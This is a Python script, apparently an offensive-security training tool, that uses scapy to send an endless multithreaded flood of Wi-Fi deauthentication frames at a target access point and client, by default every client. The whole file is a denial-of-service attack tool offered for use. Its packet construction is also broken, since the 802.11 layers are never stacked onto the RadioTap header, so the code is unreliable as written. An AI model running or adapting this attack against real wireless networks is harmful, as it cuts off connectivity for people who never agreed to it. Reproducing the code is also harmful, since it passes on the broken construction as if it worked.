print("+---_----------------------------------+")
print("|    Adversarial Informatics Combat    |")
print("|          Wifi Deauth Attack          |")
print("|         cygienesolutions.com         |")
print("| [Usage]: ./wifi_deauth_attack.py     |")
print("+--------------------------------------+")

from datetime import datetime
from wifi import Cell
from scapy.all import *
import threading
import sys

iface = "wlan1mon"
timeout = 1
iwconfig_cmd = "/usr/sbin/iwconfig"

if len(sys.argv) < 2:
	print(sys.argv[0] + " <bssid> [client]")
	sys.exit(0)
else:
	bssid = sys.argv[1]
	
if len(sys.argv) == 3:
	dest = sys.argv[2]
else:
	dest = "ff:ff:ff:ff:ff:ff"
	
pkt = RadioTap()
Dot11(subtype=0xc, addr1=dest, addr2=bssid, addr3=bssid)
Dot11Deauth(reason=3)

def send_packet(name):
	sendp(pkt, iface=iface)

while 1:
	x = threading.Thread(target=send_packet, args=(1,))
	x.start()

#while True:
#	print("Sending deauth to " + dest)
#	sendp(pkt, iface=iface)
	#time.sleep(timeout)
	
